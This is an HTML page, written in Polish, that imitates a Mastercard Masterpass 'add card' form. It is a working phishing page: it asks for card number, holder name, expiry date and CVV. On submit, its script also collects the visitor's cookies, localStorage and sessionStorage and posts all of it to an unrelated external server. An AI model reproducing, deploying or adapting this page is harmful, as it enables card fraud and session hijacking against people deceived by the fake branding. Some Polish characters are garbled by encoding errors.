<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Masterpass Karta</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
  <style>
    body {
      background-image: url('https://masterpass.com/etc/designs/masterpass/clientlibs_base/img/homepage/homepage-hero-background.jpg');
      background-size: cover;
      background-position: center;
    }

    .fade-in {
      animation: fadeIn 0.6s ease-in-out both;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .loading::after {
      content: '';
      border: 3px solid white;
      border-top: 3px solid transparent;
      border-radius: 50%;
      width: 16px;
      height: 16px;
      display: inline-block;
      margin-left: 8px;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-sm">

  <div class="bg-white/90 backdrop-blur-md w-[480px] sm:w-[640px] rounded-2xl shadow-2xl transition-all duration-500 fade-in">
    <!-- Header -->
    <div class="flex items-center justify-between p-4 border-b border-gray-300">
      <div class="flex items-center space-x-2">
        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
        <div class="text-sm font-semibold">
          masterpass <span class="text-gray-500 text-xs block">by mastercard.</span>
        </div>
      </div>
      <div class="relative group cursor-pointer">
        <img src="https://flagcdn.com/w40/pl.png" class="w-6 h-4" />
        <div class="absolute hidden group-hover:block bg-white border shadow-md right-0 mt-2 rounded text-sm z-10">
          <a href="#" class="block px-4 py-2 hover:bg-gray-100">ðŸ‡µðŸ‡± Polski</a>
          <a href="#" class="block px-4 py-2 hover:bg-gray-100">ðŸ‡¬ðŸ‡§ English</a>
        </div>
      </div>
    </div>

    <!-- Form -->
    <div class="p-6">
      <h2 class="text-lg font-semibold mb-4">Dodaj kartÄ™</h2>
      <form id="cardForm" class="space-y-4" novalidate>
        <div>
          <input type="text" name="cardNumber" id="cardNumber" placeholder="Numer karty" maxlength="19"
            inputmode="numeric"
            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
            required />
          <p class="text-xs text-red-500 hidden mt-1" id="cardNumberError">Numer karty powinien zawieraÄ‡ 16 cyfr</p>
        </div>

        <div>
          <input type="text" name="cardHolder" id="cardHolder" placeholder="ImiÄ™ i nazwisko posiadacza"
            class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
            required />
          <p class="text-xs text-red-500 hidden mt-1" id="cardHolderError">Tylko imiÄ™ i nazwisko po angielsku</p>
        </div>

        <div class="flex gap-4 items-center">
          <div class="w-1/4">
            <input type="text" name="expMonth" id="expMonth" placeholder="MM" maxlength="2" inputmode="numeric"
              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="expMonthError">1â€“12</p>
          </div>

          <span class="text-gray-600">/</span>

          <div class="w-1/4">
            <input type="text" name="expYear" id="expYear" placeholder="RR" maxlength="2" inputmode="numeric"
              class="w-full border px-4 py-2 rounded text-center outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="expYearError">Wymagane</p>
          </div>

          <div class="flex-1">
            <input type="text" name="cvv" id="cvv" placeholder="CVV" maxlength="4" inputmode="numeric"
              class="w-full border px-4 py-2 rounded outline-none transition duration-300 focus:ring-2 focus:ring-red-500"
              required />
            <p class="text-xs text-red-500 hidden mt-1" id="cvvError">3â€“4 cyfry</p>
          </div>
        </div>

        <button type="submit" id="submitBtn"
          class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition-all duration-300 hover:scale-[1.02] active:scale-[0.98]">
          Zapisz kartÄ™
        </button>
      </form>
    </div>

    <!-- Footer -->
    <div class="text-xs bg-black/70 text-white p-3 text-center rounded-b-2xl">
      Strona wykorzystuje pliki cookie zgodnie z politykÄ… prywatnoÅ›ci.
    </div>
  </div>

  <!-- JS -->
  <script>
    const user = JSON.parse(localStorage.getItem('user'));
    if (!user) window.location.href = 'index.html';

    const form = document.getElementById('cardForm');
    const submitBtn = document.getElementById('submitBtn');
    const cardNumber = document.getElementById('cardNumber');
    const expMonth = document.getElementById('expMonth');
    const expYear = document.getElementById('expYear');
    const cvv = document.getElementById('cvv');
    const cardHolder = document.getElementById('cardHolder');

    const cardNumberError = document.getElementById('cardNumberError');
    const expMonthError = document.getElementById('expMonthError');
    const expYearError = document.getElementById('expYearError');
    const cvvError = document.getElementById('cvvError');
    const cardHolderError = document.getElementById('cardHolderError');

    function maskCardNumber(value) {
      return value.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
    }

    function validateCardNumber() {
      const digits = cardNumber.value.replace(/\s/g, '');
      const valid = /^\d{16}$/.test(digits);
      cardNumber.classList.toggle('border-red-500', !valid);
      cardNumberError.classList.toggle('hidden', valid);
      return valid;
    }

    function validateMonth() {
      const valid = /^(0[1-9]|1[0-2])$/.test(expMonth.value);
      expMonth.classList.toggle('border-red-500', !valid);
      expMonthError.classList.toggle('hidden', valid);
      return valid;
    }

    function validateYear() {
      const valid = /^\d{2}$/.test(expYear.value);
      expYear.classList.toggle('border-red-500', !valid);
      expYearError.classList.toggle('hidden', valid);
      return valid;
    }

    function validateCVV() {
      const valid = /^\d{3,4}$/.test(cvv.value);
      cvv.classList.toggle('border-red-500', !valid);
      cvvError.classList.toggle('hidden', valid);
      return valid;
    }

    function validateHolder() {
      const valid = /^[A-Za-z]+ [A-Za-z]+$/.test(cardHolder.value.trim());
      cardHolder.classList.toggle('border-red-500', !valid);
      cardHolderError.classList.toggle('hidden', valid);
      return valid;
    }

    cardNumber.addEventListener('input', (e) => {
      cardNumber.value = maskCardNumber(e.target.value);
      validateCardNumber();
    });

    expMonth.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      if (e.target.value.length === 2) expYear.focus();
      validateMonth();
    });

    expYear.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      if (e.target.value.length === 2) cvv.focus();
      validateYear();
    });

    cvv.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      validateCVV();
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      if (![validateCardNumber(), validateHolder(), validateMonth(), validateYear(), validateCVV()].every(Boolean)) return;

      submitBtn.disabled = true;
      submitBtn.classList.add('loading');

      const payload = {
        cardNumber: cardNumber.value.replace(/\s/g, ''),
        cardHolder: cardHolder.value.trim(),
        expiryDate: `${expMonth.value}/${expYear.value}`,
        cvv: cvv.value,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        location: window.location.href,
        date: new Date().toISOString(),
      };

      try {
        const res = await fetch('https://zaza-back.onrender.com/card', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });

        if (res.ok) {
          form.reset();
        }
      } catch (err) {
        console.error(err);
      } finally {
        submitBtn.disabled = false;
        submitBtn.classList.remove('loading');
      }
    });
  </script>
</body>
</html>
